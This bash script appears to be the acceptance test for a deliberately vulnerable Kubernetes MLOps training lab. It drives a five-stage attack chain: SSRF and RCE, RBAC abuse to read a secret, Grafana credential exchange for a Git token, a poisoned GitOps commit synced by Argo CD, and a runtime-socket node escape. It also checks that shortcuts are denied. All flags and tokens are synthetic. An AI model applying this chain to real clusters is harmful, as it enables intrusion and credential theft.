#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd -- "${SCRIPT_DIR}/../.." && pwd)"
STAGE5_BASE="${ROOT_DIR}/lab/stages/stage-05-runtime/runtime-builder-base.yaml"
STAGE5_DESIRED="${ROOT_DIR}/lab/stages/stage-05-runtime/repository/runtime-builder/deployment.yaml"

GITEA_USER="stage3-lab-writer"
GITEA_TOKEN="SYNTHETIC_STAGE3_GIT_TOKEN"
GITEA_REPOSITORY="vuln-mlops-gitops"
GIT_BRANCH="stage4-lab"
MODELGATE_USER="system:serviceaccount:modelgate-lab:modelgate"
ARGO_USER="system:serviceaccount:stage-04-gitops:argocd-application-controller"
POC_PYTHON="${POC_PYTHON:-python3}"

WORK_DIR="$(mktemp -d)"
PORT_FORWARD_PID=""
PORT_FORWARD_LOG=""
GIT_REPOSITORY_DIR="${WORK_DIR}/repository"
RESTORE_GIT_BASELINE=false

stop_port_forward() {
  if [[ -n "$PORT_FORWARD_PID" ]] && kill -0 "$PORT_FORWARD_PID" 2>/dev/null; then
    kill "$PORT_FORWARD_PID" 2>/dev/null || true
    wait "$PORT_FORWARD_PID" 2>/dev/null || true
  fi
  PORT_FORWARD_PID=""
}

push_git_manifest() {
  local source_manifest="$1"
  local commit_message="$2"

  cp "$source_manifest" "${GIT_REPOSITORY_DIR}/runtime-builder/deployment.yaml"
  git -C "$GIT_REPOSITORY_DIR" add runtime-builder/deployment.yaml
  if git -C "$GIT_REPOSITORY_DIR" diff --cached --quiet; then
    git -C "$GIT_REPOSITORY_DIR" rev-parse HEAD
    return
  fi
  git -C "$GIT_REPOSITORY_DIR" commit -m "$commit_message" >/dev/null
  git -C "$GIT_REPOSITORY_DIR" push origin "HEAD:${GIT_BRANCH}" >/dev/null
  git -C "$GIT_REPOSITORY_DIR" rev-parse HEAD
}

point_git_remote_at_current_forward() {
  local port remote_url
  port="$(forwarded_port)"
  remote_url="http://${GITEA_USER}:${GITEA_TOKEN}@127.0.0.1:${port}/${GITEA_USER}/${GITEA_REPOSITORY}.git"
  git -C "$GIT_REPOSITORY_DIR" remote set-url origin "$remote_url"
}

cleanup() {
  local exit_code=$?
  set +e
  stop_port_forward
  if [[ "$RESTORE_GIT_BASELINE" == true && -d "${GIT_REPOSITORY_DIR}/.git" ]]; then
    start_port_forward stage-04-gitops service/gitea 3000
    point_git_remote_at_current_forward
    push_git_manifest "$STAGE5_BASE" "restore runtime-builder baseline after acceptance" >/dev/null
    kubectl -n stage-04-gitops annotate application/runtime-builder \
      argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1
    stop_port_forward
  fi
  kubectl -n stage-02-rbac delete job/stage-02-secret-reader --ignore-not-found >/dev/null 2>&1
  kubectl -n stage-02-rbac delete pod/stage-03-client --ignore-not-found >/dev/null 2>&1
  rm -rf -- "$WORK_DIR"
  exit "$exit_code"
}
trap cleanup EXIT

for command_name in kubectl curl git base64 mktemp "$POC_PYTHON"; do
  if ! command -v "$command_name" >/dev/null 2>&1; then
    printf 'ERROR: required acceptance command is missing: %s\n' "$command_name" >&2
    exit 1
  fi
done

"$POC_PYTHON" -c \
  'import sys, httpx, mlflow, numpy, statsmodels; assert sys.version_info[:2] == (3, 11)' \
  >/dev/null || {
    printf 'ERROR: POC_PYTHON must be the prepared Python 3.11 environment with dev requirements.\n' >&2
    exit 1
  }

start_port_forward() {
  local namespace="$1"
  local service="$2"
  local remote_port="$3"
  local attempt

  stop_port_forward
  PORT_FORWARD_LOG="${WORK_DIR}/${namespace}-${service##*/}-port-forward.log"
  kubectl -n "$namespace" port-forward \
    --address 127.0.0.1 "$service" ":${remote_port}" \
    >"$PORT_FORWARD_LOG" 2>&1 &
  PORT_FORWARD_PID=$!

  for attempt in $(seq 1 60); do
    if ! kill -0 "$PORT_FORWARD_PID" 2>/dev/null; then
      cat "$PORT_FORWARD_LOG" >&2
      printf 'ERROR: port-forward stopped unexpectedly.\n' >&2
      exit 1
    fi
    if grep -Eq "Forwarding from 127\\.0\\.0\\.1:[0-9]+ -> ${remote_port}" "$PORT_FORWARD_LOG"; then
      return
    fi
    sleep 1
  done
  printf 'ERROR: timed out waiting for port-forward.\n' >&2
  exit 1
}

forwarded_port() {
  sed -nE 's/.*127\.0\.0\.1:([0-9]+) -> [0-9]+.*/\1/p' "$PORT_FORWARD_LOG" | head -n 1
}

wait_for_argo_revision() {
  local expected_revision="$1"
  local attempt sync health revision

  kubectl -n stage-04-gitops annotate application/runtime-builder \
    argocd.argoproj.io/refresh=hard --overwrite >/dev/null
  for attempt in $(seq 1 120); do
    sync="$(kubectl -n stage-04-gitops get application runtime-builder -o jsonpath='{.status.sync.status}')"
    health="$(kubectl -n stage-04-gitops get application runtime-builder -o jsonpath='{.status.health.status}')"
    revision="$(kubectl -n stage-04-gitops get application runtime-builder -o jsonpath='{.status.sync.revision}')"
    if [[ "$sync" == "Synced" && "$health" == "Healthy" && "$revision" == "$expected_revision" ]]; then
      return
    fi
    sleep 5
  done
  printf 'ERROR: Argo CD did not reconcile revision %s.\n' "$expected_revision" >&2
  exit 1
}

wait_for_participant_argo_revision() {
  local expected_revision="$1"
  local attempt payload sync health revision

  for attempt in $(seq 1 120); do
    payload="$(curl -fsS "${foothold_url}/stage-04/application")"
    sync="$(printf '%s' "$payload" | "$POC_PYTHON" -c \
      'import json, sys; print(json.load(sys.stdin)["sync"])')"
    health="$(printf '%s' "$payload" | "$POC_PYTHON" -c \
      'import json, sys; print(json.load(sys.stdin)["health"])')"
    revision="$(printf '%s' "$payload" | "$POC_PYTHON" -c \
      'import json, sys; print(json.load(sys.stdin)["revision"])')"
    if [[ "$sync" == "Synced" && "$health" == "Healthy" && "$revision" == "$expected_revision" ]]; then
      printf '%s' "$payload"
      return
    fi
    sleep 5
  done
  printf 'ERROR: participant API did not observe Argo CD revision %s.\n' "$expected_revision" >&2
  exit 1
}

printf '\n[Stage 1] synthetic SSRF and marker-only RCE\n'
if [[ -n "${POC_MODELGATE_URL:-}" ]]; then
  modelgate_url="${POC_MODELGATE_URL%/}"
else
  start_port_forward modelgate-lab service/modelgate 80
  modelgate_url="http://127.0.0.1:$(forwarded_port)"
fi
modelgate_ready=false
for _ in $(seq 1 60); do
  if curl -fsS --max-time 5 "${modelgate_url}/readyz" >/dev/null 2>&1; then
    modelgate_ready=true
    break
  fi
  sleep 2
done
if [[ "$modelgate_ready" != true ]]; then
  printf 'ERROR: ModelGate participant endpoint is not ready: %s\n' "$modelgate_url" >&2
  exit 1
fi
POC_MODELGATE_URL="$modelgate_url" POC_CANARY_TARGET=eks \
  "$POC_PYTHON" "${ROOT_DIR}/poc/ssrf_canary.py"
rce_result="$(POC_MODELGATE_URL="$modelgate_url" \
  "$POC_PYTHON" "${ROOT_DIR}/poc/rce_marker.py" --timeout 120)"
printf '%s\n' "$rce_result"
foothold_session="$(printf '%s' "$rce_result" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["foothold_session"])')"
foothold_url="${modelgate_url}/api/lab/footholds/${foothold_session}"

printf '\n[Stage 2] modelgate ServiceAccount to monitoring-runner\n'
if kubectl -n stage-02-rbac get secret/stage-02-flag \
    --as="$MODELGATE_USER" >/dev/null 2>&1; then
  printf 'ERROR: modelgate directly read the Stage 2 Secret.\n' >&2
  exit 1
fi

stage2_rules="$(curl -fsS "${foothold_url}/self-rules")"
printf '%s' "$stage2_rules" | "$POC_PYTHON" -c '
import json, sys
rules = json.load(sys.stdin)["resource_rules"]
if not any("create" in rule.get("verbs", []) and
           "jobs" in rule.get("resources", []) for rule in rules):
    raise SystemExit("ERROR: fixed Job permission was not discovered")
'

curl -fsS -X POST "${foothold_url}/stage-02/job" >/dev/null
for _ in $(seq 1 60); do
  stage2_status="$(curl -fsS "${foothold_url}/stage-02/job")"
  if printf '%s' "$stage2_status" | "$POC_PYTHON" -c \
      'import json, sys; raise SystemExit(json.load(sys.stdin)["succeeded"] < 1)'
  then
    break
  fi
  sleep 2
done

stage2_log="$(curl -fsS "${foothold_url}/stage-02/log")"
stage2_encoded="$(printf '%s' "$stage2_log" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["encoded_proof"])')"
stage2_flag="$(printf '%s' "$stage2_encoded" | base64 --decode)"
test "$stage2_flag" = 'FLAG{stage_2_rbac_chaining_placeholder}'
printf 'PASS: RCE foothold relay submitted the fixed Stage 2 Job and returned the synthetic flag.\n'

printf '\n[Stage 3] Grafana datasource to credential broker\n'
stage3_datasources="$(curl -fsS "${foothold_url}/stage-03/datasources")"
grep -q 'stage3-prometheus' <<<"$stage3_datasources"
stage3_query="$(curl -fsS "${foothold_url}/stage-03/query")"
stage3_ref="$(printf '%s' "$stage3_query" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["credential_ref"])')"
test "$stage3_ref" = 'stage3-lab-repo-writer'
grep -q 'runtime-builder' <<<"$stage3_query"
stage3_proof="$(curl -fsS \
  "${foothold_url}/stage-03/exchange/${stage3_ref}")"
grep -q 'FLAG{stage_3_monitoring_trust_placeholder}' <<<"$stage3_proof"
grep -q 'SYNTHETIC_STAGE3_GIT_TOKEN' <<<"$stage3_proof"
stage3_user="$(printf '%s' "$stage3_proof" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["username"])')"
stage3_token="$(printf '%s' "$stage3_proof" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["token"])')"
stage4_gateway="$(printf '%s' "$stage3_proof" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["git_gateway"])')"
arbitrary_status="$(curl -sS -o /dev/null -w '%{http_code}' \
  "${foothold_url}/stage-03/exchange/arbitrary-reference")"
if [[ "$arbitrary_status" != "404" ]]; then
  printf 'ERROR: arbitrary Stage 3 credential reference was accepted.\n' >&2
  exit 1
fi
printf 'PASS: Stage 3 datasource discovery/exchange succeeded and arbitrary reference was denied.\n'

printf '\n[Stage 4] restricted Git change to Argo reconciliation\n'
git_url="$("$POC_PYTHON" -c '
import sys
from urllib.parse import quote, urlsplit, urlunsplit

base, user, token, path = sys.argv[1:]
parts = urlsplit(base)
if (parts.scheme not in ("http", "https") or not parts.netloc or
        parts.path not in ("", "/") or parts.query or parts.fragment or
        not path.startswith("/api/lab/footholds/") or
        not path.endswith("/stage-04/git/vuln-mlops-gitops.git")):
    raise SystemExit("ERROR: invalid fixed ModelGate Git gateway URL")
encoded_user = quote(user, safe="")
encoded_token = quote(token, safe="")
authority = f"{encoded_user}:{encoded_token}@{parts.netloc}"
print(urlunsplit((parts.scheme, authority, path, "", "")))
' "$modelgate_url" "$stage3_user" "$stage3_token" "$stage4_gateway")"
git clone --quiet --branch "$GIT_BRANCH" --single-branch "$git_url" "$GIT_REPOSITORY_DIR"
git -C "$GIT_REPOSITORY_DIR" config user.name "$GITEA_USER"
git -C "$GIT_REPOSITORY_DIR" config user.email lab@example.invalid

printf 'shortcut-denial\n' >"${GIT_REPOSITORY_DIR}/forbidden.txt"
git -C "$GIT_REPOSITORY_DIR" add forbidden.txt
git -C "$GIT_REPOSITORY_DIR" commit -m 'verify forbidden Git path' >/dev/null
if git -C "$GIT_REPOSITORY_DIR" push origin "HEAD:${GIT_BRANCH}" >/dev/null 2>&1; then
  printf 'ERROR: Stage 4 forbidden Git path was accepted.\n' >&2
  exit 1
fi
git -C "$GIT_REPOSITORY_DIR" reset --hard "origin/${GIT_BRANCH}" >/dev/null

stage5_revision="$(push_git_manifest "$STAGE5_DESIRED" 'exercise Stage 4 and Stage 5 path')"
RESTORE_GIT_BASELINE=true
stage4_status="$(wait_for_participant_argo_revision "$stage5_revision")"
stage4_proof="$(printf '%s' "$stage4_status" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["stage4_proof"])')"
stage5_mode="$(printf '%s' "$stage4_status" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["stage5_mode"])')"
test "$stage4_proof" = 'FLAG{stage_4_gitops_placeholder}'
test "$stage5_mode" = 'runtime-socket'
printf 'PASS: Stage 4 commit %s reconciled through Argo CD.\n' "$stage5_revision"
stop_port_forward

printf '\n[Stage 5] runtime socket to synthetic node proof\n'
runtime_relay="$(printf '%s' "$stage4_status" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["runtime_relay"])')"
test "$runtime_relay" = "/api/lab/footholds/${foothold_session}/stage-05/runtime/proof"

body_status="$(curl -sS -o /dev/null -w '%{http_code}' \
  -X POST -H 'Content-Type: application/json' -d '{}' \
  "${modelgate_url}${runtime_relay}")"
test "$body_status" = 400

stage5_result="$(curl -fsS -X POST "${modelgate_url}${runtime_relay}")"
stage5_proof="$(printf '%s' "$stage5_result" | "$POC_PYTHON" -c \
  'import json, sys; print(json.load(sys.stdin)["flag"])')"
test "$stage5_proof" = 'FLAG{stage_5_node_placeholder}'

if [[ "$(kubectl auth can-i create deployments.apps --as="$ARGO_USER" -n stage-05-runtime)" != no ]]; then
  printf 'ERROR: Argo controller can create deployments.\n' >&2
  exit 1
fi
if kubectl -n stage-05-runtime patch deployment/runtime-builder --type=json \
    --patch='[{"op":"replace","path":"/spec/template/spec/nodeSelector/lab.vuln-mlops~1node-role","value":"general"}]' \
    --dry-run=server --as="$ARGO_USER" >/dev/null 2>&1; then
  printf 'ERROR: Stage 5 node shortcut was accepted.\n' >&2
  exit 1
fi
printf 'PASS: proof-bound runtime relay reached only the synthetic escape-node proof channel.\n'

printf '\n[Cleanup] restore reviewed baseline\n'
start_port_forward stage-04-gitops service/gitea 3000
point_git_remote_at_current_forward
baseline_revision="$(push_git_manifest "$STAGE5_BASE" 'restore runtime-builder baseline after acceptance')"
stop_port_forward
wait_for_argo_revision "$baseline_revision"
kubectl -n stage-05-runtime rollout status deployment/runtime-builder --timeout=5m
RESTORE_GIT_BASELINE=false
kubectl -n stage-02-rbac delete job/stage-02-secret-reader --ignore-not-found >/dev/null
kubectl -n stage-02-rbac delete pod/stage-03-client --ignore-not-found >/dev/null

printf '\nPASS: Stage 1-5 intended path and representative shortcut denials completed.\n'
